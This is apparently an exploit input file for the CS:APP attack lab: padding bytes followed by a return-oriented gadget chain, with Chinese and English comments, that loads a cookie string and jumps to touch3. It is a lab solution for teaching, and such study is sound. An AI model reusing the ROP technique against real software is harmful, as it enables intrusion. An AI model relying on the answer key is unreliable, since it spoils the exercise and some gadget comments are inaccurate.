00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00  /*  popq %rax */
20 00 00 00 00 00 00 00  /* 偏移量 */
dd 19 40 00 00 00 00 00  /* movl %eax, %edx;ret; */
69 1a 40 00 00 00 00 00  /* movl %edx, %ecx;ret; */
13 1a 40 00 00 00 00 00  /* movl %ecx, %esi;ret; */
06 1a 40 00 00 00 00 00  /* movq %rsp, %rax;ret */
a2 19 40 00 00 00 00 00  /* movl %rax, %rdi;ret; */
d6 19 40 00 00 00 00 00  /* lea (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00  /* movl %rax, %rdi;ret; */
fa 18 40 00 00 00 00 00  /* touch3 address */
35 39 62 39 39 37 66 61  /* cooki字符串 */
